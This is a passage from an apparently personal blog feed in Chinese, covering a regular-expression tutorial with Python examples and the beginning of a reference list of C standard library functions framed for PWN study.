class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w&#123;3&#125;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'roo'</span>, <span class="string">'www'</span>, <span class="string">'bai'</span>, <span class="string">'com'</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)@&#123;3&#125;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^\w]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^\w]&#123;3&#125;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'root'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)&#123;3&#125;@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'t'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)&#123;0,3&#125;@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'root'</span>]</span><br></pre></td></tr></table></figure><p><code>|</code></p><blockquote><p>指明两项之间的一个选择。要匹配 |，请使用 \|。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@|#"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@|root@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'root@'</span>]</span><br></pre></td></tr></table></figure><h4 id="4限定符"><a class="markdownIt-Anchor" href="#4限定符"></a> 4.限定符</h4><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 ***** 或 <strong>+</strong> 或 <strong>?</strong> 或 <strong>{n}</strong> 或 <strong>{n,}</strong> 或 <strong>{n,m}</strong> 共6种。</p><p>正则表达式的限定符有：</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>*</td><td>匹配前面的子表达式<strong>零次</strong>或<strong>多次</strong>。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式<strong>一次</strong>或<strong>多次</strong>。例如，‘zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式<strong>零次</strong>或<strong>一次</strong>。例如，“do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td></tr><tr><td>{n}</td><td>n 是一个非负整数。匹配确定的 n 次。例如，‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td>{n,}</td><td>n 是一个非负整数。至少匹配n 次。例如，‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。‘o{1,}’ 等价于 ‘o+’。‘o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td>{n,m}</td><td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，“o{1,3}” 将匹配 “fooooood” 中的前三个 o。‘o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr></tbody></table><p><code>/[1-9][0-9]*/</code></p><blockquote><p><strong>[1-9]<strong>设置第一个数字不是 0，</strong>[0-9]*</strong> 表示任意多个数字。请注意，限定符出现在范围表达式之后。因此，它应用于整个范围表达式，在本例中，只指定从 0 到 9 的数字（包括 0 和 9）。这里不使用 + 限定符，因为在第二个位置或后面的位置不一定需要有一个数字。也不使用 ? 字符，因为使用 ? 会将整数限制到只有两位数。如果你想设置 0~99 的两位数，可以使用下面的表达式来至少指定一位但至多两位数字。</p></blockquote><p><code>/[0-9]{1,2}/</code></p><p>上面的表达式的缺点是，只能匹配两位数字，而且可以匹配 0、00、01、10 99 的章节编号仍只匹配开头两位数字。</p><p>改进下，匹配 1~99 的正整数表达式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]?/</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure><p><code>* + ?</code></p><blockquote><p><code>*</code>和<code>+</code>是贪婪的，<code>?</code>是非贪婪的</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"&lt;h1&gt;RUNOOB-菜鸟教程&lt;/h1&gt;"</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.&gt;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.?&gt;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.*&gt;"</span>)<span class="comment"># 贪婪</span></span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'&lt;h1&gt;RUNOOB-菜鸟教程&lt;/h1&gt;'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.*?&gt;"</span>)<span class="comment"># 非贪婪</span></span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'&lt;h1&gt;'</span>, <span class="string">'&lt;/h1&gt;'</span>]</span><br></pre></td></tr></table></figure><h4 id="5定位符"><a class="markdownIt-Anchor" href="#5定位符"></a> 5.定位符</h4><blockquote><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。定位符用来描述字符串或单词的边界，<strong>^</strong> 和 <strong>$</strong> 分别指字符串的开始与结束，<strong>\b</strong> 描述单词的前或后边界，<strong>\B</strong> 表示非单词边界。</p></blockquote><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>^</td><td>匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td></tr><tr><td>$</td><td>匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td></tr><tr><td>\b</td><td>匹配一个单词边界，即字与空格间的位置。</td></tr><tr><td>\B</td><td>非单词边界匹配。</td></tr></tbody></table><blockquote><p><font size="2"><strong>注意</strong>：不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 <strong>^*</strong> 之类的表达式。</font></p><p><font size="2">若要匹配一行文本开始处的文本，请在正则表达式的开始使用 <strong>^</strong> 字符。不要将 <strong>^</strong> 的这种用法与中括号表达式内的用法混淆。</font></p><p><font size="2">若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 <strong>$</strong> 字符。</font></p></blockquote><p>若要在搜索章节标题时使用定位点，下面的正则表达式匹配一个章节标题，该标题只包含两个尾随数字，并且出现在行首：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure><p>真正的章节标题不仅出现行的开始处，而且它还是该行中仅有的文本。它即出现在行首又出现在同一行的结尾。下面的表达式能确保指定的匹配只匹配章节而不匹配交叉引用。通过创建只匹配一行文本的开始和结尾的正则表达式，就可做到这一点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure><p>匹配单词边界稍有不同，但向正则表达式添加了很重要的能力。单词边界是单词和空格之间的位置。非单词边界是任何其他位置。下面的表达式匹配单词 Chapter 的开头三个字符，因为这三个字符出现在单词边界后面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\bCha/</span><br></pre></td></tr></table></figure><p><strong>\b</strong> 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在单词边界的前面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ter\b/</span><br></pre></td></tr></table></figure><p>下面的表达式匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\Bapt/</span><br></pre></td></tr></table></figure><p>字符串 apt 出现在单词 Chapter 中的非单词边界处，但出现在单词 aptitude 中的单词边界处。对于 <strong>\B</strong> 非单词边界运算符，位置并不重要，因为匹配不关心究竟是单词的开头还是结尾。</p><blockquote><p>\b，\B是单词边界，不匹配任何实际字符，所以是看不到的；\B是\b的非(补)。</p><ul><li><p>\b：表示字母数字与非字母数字的边界，   非字母数字与字母数字的边界。</p></li><li><p>\B：表示字母数字与(非非)字母数字的边界，非字母数字与非字母数字的边界。</p></li></ul></blockquote><h3 id="0x02-修饰符标记"><a class="markdownIt-Anchor" href="#0x02-修饰符标记"></a> 0x02 修饰符（标记）</h3><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p><p>标记不写在正则表达式里，标记位于表达式之外，格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/pattern/flags</span><br><span class="line"></span><br><span class="line">python中的格式： re.search(pattern, strings, re.I|re.G|)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">修饰符</th><th style="text-align:left">含义</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">i</td><td style="text-align:left">ignore - 不区分大小写</td><td style="text-align:left">将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td style="text-align:left">g</td><td style="text-align:left">global - 全局匹配</td><td style="text-align:left">查找所有的匹配项。</td></tr><tr><td style="text-align:left">m</td><td style="text-align:left">more - 多行匹配</td><td style="text-align:left">使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td></tr><tr><td style="text-align:left">s</td><td style="text-align:left">特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td style="text-align:left">默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td></tr></tbody></table><h3 id="0x02-正则表达式-元字符"><a class="markdownIt-Anchor" href="#0x02-正则表达式-元字符"></a> 0x02 正则表达式 - 元字符</h3><p>下表包含了元字符的完整列表以及它们在正则表达式上下文中的行为：</p><table><thead><tr><th style="text-align:left">字符</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">\</td><td style="text-align:left">将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，‘n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\’ 匹配 “” 而 “(” 则匹配 “(”。</td></tr><tr><td style="text-align:left">^</td><td style="text-align:left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td style="text-align:left">$</td><td style="text-align:left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td style="text-align:left">*</td><td style="text-align:left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td style="text-align:left">+</td><td style="text-align:left">匹配前面的子表达式一次或多次。例如，‘zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td style="text-align:left">?</td><td style="text-align:left">匹配前面的子表达式零次或一次。例如，“do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。</td></tr><tr><td style="text-align:left">{n}</td><td style="text-align:left">n 是一个非负整数。匹配确定的 n 次。例如，‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td style="text-align:left">{n,}</td><td style="text-align:left">n 是一个非负整数。至少匹配n 次。例如，‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。‘o{1,}’ 等价于 ‘o+’。‘o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td style="text-align:left">{n,m}</td><td style="text-align:left">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，“o{1,3}” 将匹配 “fooooood” 中的前三个 o。‘o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td style="text-align:left">?</td><td style="text-align:left">当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，‘o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。</td></tr><tr><td style="text-align:left">.</td><td style="text-align:left">匹配除换行符（\n、\r）之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像&quot;<strong>(.|\n)</strong>&quot;的模式。</td></tr><tr><td style="text-align:left">(pattern)</td><td style="text-align:left">匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(’ 或 ‘)’。</td></tr><tr><td style="text-align:left">(?:pattern)</td><td style="text-align:left">匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， 'industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。</td></tr><tr><td style="text-align:left">(?=pattern)</td><td style="text-align:left">正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“Windows(?=95|98|NT|2000)“能匹配&quot;Windows2000&quot;中的&quot;Windows”，但不能匹配&quot;Windows3.1&quot;中的&quot;Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td style="text-align:left">(?!pattern)</td><td style="text-align:left">正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如&quot;Windows(?!95|98|NT|2000)“能匹配&quot;Windows3.1&quot;中的&quot;Windows”，但不能匹配&quot;Windows2000&quot;中的&quot;Windows&quot;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td style="text-align:left">(?&lt;=pattern)</td><td style="text-align:left">反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，&quot;<code>(?&lt;=95|98|NT|2000)Windows</code>“能匹配”<code>2000Windows</code>“中的”<code>Windows</code>&quot;，但不能匹配&quot;<code>3.1Windows</code>“中的”<code>Windows</code>&quot;。</td></tr><tr><td style="text-align:left">(?&lt;!pattern)</td><td style="text-align:left">反向否定预查，与正向否定预查类似，只是方向相反。例如&quot;<code>(?&lt;!95|98|NT|2000)Windows</code>“能匹配”<code>3.1Windows</code>“中的”<code>Windows</code>&quot;，但不能匹配&quot;<code>2000Windows</code>“中的”<code>Windows</code>&quot;。</td></tr><tr><td style="text-align:left">x|y</td><td style="text-align:left">匹配 x 或 y。例如，‘z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td></tr><tr><td style="text-align:left">[xyz]</td><td style="text-align:left">字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td></tr><tr><td style="text-align:left">[^xyz]</td><td style="text-align:left">负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、‘l’、‘i’、‘n’。</td></tr><tr><td style="text-align:left">[a-z]</td><td style="text-align:left">字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</td></tr><tr><td style="text-align:left">[^a-z]</td><td style="text-align:left">负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。</td></tr><tr><td style="text-align:left">\b</td><td style="text-align:left">匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配&quot;never&quot; 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td></tr><tr><td style="text-align:left">\B</td><td style="text-align:left">匹配非单词边界。‘er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td style="text-align:left">\cx</td><td style="text-align:left">匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td></tr><tr><td style="text-align:left">\d</td><td style="text-align:left">匹配一个数字字符。等价于 [0-9]。</td></tr><tr><td style="text-align:left">\D</td><td style="text-align:left">匹配一个非数字字符。等价于 [^0-9]。</td></tr><tr><td style="text-align:left">\f</td><td style="text-align:left">匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td style="text-align:left">\n</td><td style="text-align:left">匹配一个换行符。等价于 \x0a 和 \cJ。</td></tr><tr><td style="text-align:left">\r</td><td style="text-align:left">匹配一个回车符。等价于 \x0d 和 \cM。</td></tr><tr><td style="text-align:left">\s</td><td style="text-align:left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td></tr><tr><td style="text-align:left">\S</td><td style="text-align:left">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td></tr><tr><td style="text-align:left">\t</td><td style="text-align:left">匹配一个制表符。等价于 \x09 和 \cI。</td></tr><tr><td style="text-align:left">\v</td><td style="text-align:left">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr><tr><td style="text-align:left">\w</td><td style="text-align:left">匹配字母、数字、下划线。等价于’[A-Za-z0-9_]’。</td></tr><tr><td style="text-align:left">\W</td><td style="text-align:left">匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。</td></tr><tr><td style="text-align:left">\xn</td><td style="text-align:left">匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。</td></tr><tr><td style="text-align:left">\num</td><td style="text-align:left">匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。</td></tr><tr><td style="text-align:left">\n</td><td style="text-align:left">标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td></tr><tr><td style="text-align:left">\nm</td><td style="text-align:left">标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</td></tr><tr><td style="text-align:left">\nml</td><td style="text-align:left">如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td></tr><tr><td style="text-align:left">\un</td><td style="text-align:left">匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-正则表达式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-正则表达式&quot;&gt;&lt;/a&gt; 0x00 正则表达式&lt;/h3&gt;
&lt;h4 id=&quot;1为什么使用正则表达式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PWN中常见的 C 函数和标准头</title>
    <link href="https://muzibing.github.io/2020/09/14/2020.09.14%EF%BC%88152%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/14/2020.09.14（152）/</id>
    <published>2020-09-13T16:00:00.000Z</published>
    <updated>2020-09-18T13:37:21.145Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-常见的标准头"><a class="markdownIt-Anchor" href="#0x00-常见的标准头"></a> 0x00 常见的标准头</h3><blockquote><p>参考：<a href="https://www.runoob.com/cprogramming/c-standard-library.html" target="_blank" rel="noopener">菜鸟教程C标准库 - 参考手册</a></p></blockquote><p>标准头文件包括：</p><table><thead><tr><th>标准头</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-errno-h.html" target="_blank" rel="noopener">&lt;errno.h&gt;</a></td><td style="text-align:left">错误信息</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-stdio-h.html" target="_blank" rel="noopener">&lt;stdio.h&gt;</a></td><td style="text-align:left">输入输出函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-stddef-h.html" target="_blank" rel="noopener">&lt;stddef.h&gt;</a></td><td style="text-align:left">标准定义</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-math-h.html" target="_blank" rel="noopener">&lt;math.h&gt;</a></td><td style="text-align:left">数学函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-ctype-h.html" target="_blank" rel="noopener">&lt;ctype.h&gt;</a></td><td style="text-align:left">字符处理函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-string-h.html" target="_blank" rel="noopener">&lt;string.h&gt;</a></td><td style="text-align:left">字符串函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-stdlib-h.html" target="_blank" rel="noopener">&lt;stdlib.h&gt;</a></td><td style="text-align:left">功能函数</td></tr></tbody></table><h3 id="0x01-相关的函数"><a class="markdownIt-Anchor" href="#0x01-相关的函数"></a> 0x01 相关的函数</h3><h4 id="1输入输出函数stdioh"><a class="markdownIt-Anchor" href="#1输入输出函数stdioh"></a> 1.输入输出函数(&lt;stdio.h&gt;)</h4><p><code>文件打开和关闭</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fopen.html" target="_blank" rel="noopener">fopen(filename,mode,include_path,context)</a></td><td>fopen() 函数打开一个文件或 URL。<br>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fclose.html" target="_blank" rel="noopener">int fclose(FILE *stream)</a></td><td>C 库函数 <strong>int fclose(FILE *stream)</strong> 关闭流 stream。刷新所有的缓冲区。</td></tr></tbody></table><p><code>字符输入输出</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fgetc.html" target="_blank" rel="noopener">int fgetc(FILE *fp);</a></td><td>从指定的流 stream 获取下一个字符（一个无符号字符），<br>并把位置标识符往前移动。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fputc.html" target="_blank" rel="noopener">int fputc(int c, FILE *fp);</a></td><td>C 库函数 <strong>int fputc(int char, FILE *stream)</strong> 把参数 <strong>char</strong> 指定的字符（一个无符号字符）<br>写入到指定的流 stream 中，并把位置标识符往前移动。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-ungetc.html" target="_blank" rel="noopener">int ungetc(int c, FILE* stream);</a></td><td>C 库函数 <strong>int ungetc(int char, FILE *stream)</strong> 把字符 <strong>char</strong>（一个无符号字符）<br>推入到指定的流 <strong>stream</strong> 中，以便它是下一个被读取到的字符。</td></tr></tbody></table><p><code>格式化输入输出</code></p><table><thead><tr><th style="text-align:left">函数原型</th><th>解释</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-scanf.html" target="_blank" rel="noopener">int scanf(const char *format, …);</a></td><td>从标准输入 stdin 读取格式化输入。</td></tr><tr><td style="text-align:left"><a href>int printf(const char *format, …);</a></td><td>发送格式化输出到标准输出 stdout。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-fscanf.html" target="_blank" rel="noopener">int fscanf(FILE *stream, const char *format, …);</a></td><td>从流 stream 读取格式化输入。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-fprintf.html" target="_blank" rel="noopener">(int fprintf(FILE *stream, const char *format, …);</a></td><td>发送格式化输出到流 stream 中。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-sscanf.html" target="_blank" rel="noopener">int sscanf(char *s, const char *format, …);</a></td><td>从字符串读取格式化输入。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-sprintf.html" target="_blank" rel="noopener">int sprintf(char *s, const char *format, …);</a></td><td>发送格式化输出到 <strong>str</strong> 所指向的字符串。</td></tr></tbody></table><p><code>行式输入输出</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fgets.html" target="_blank" rel="noopener">char *fgets(char *str, int n, FILE *stream)</a></td><td>从指定的流 stream 读取一行，并把它存储在 <strong>str</strong> 所指向的字符串内。<br>当读取 <strong>(n-1)</strong> 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fputs.html" target="_blank" rel="noopener">int fputs(const char *str, FILE *stream)</a></td><td>把字符串写入到指定的流 stream 中，但不包括空字符。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-gets.html" target="_blank" rel="noopener">char *gets(char *str)</a></td><td>C 库函数 <strong>char *gets(char *str)</strong> 从标准输入 stdin 读取一行，并把它存储在 str 所指向的字符串中。<br>当读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-puts.html" target="_blank" rel="noopener">int puts(const char *str)</a></td><td>C 库函数 <strong>int puts(const char *str)</strong> 把一个字符串写入到标准输出 stdout，直到空字符，<br>但不包括空字符。换行符会被追加到输出中。</td></tr></tbody></table><p><code>直接输入输出</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fread.html" target="_blank" rel="noopener">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</a></td><td>从给定流 <strong>stream</strong> 读取数据到 <strong>ptr</strong> 所指向的数组中</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fwrite.html" target="_blank" rel="noopener">size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)</a></td><td>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 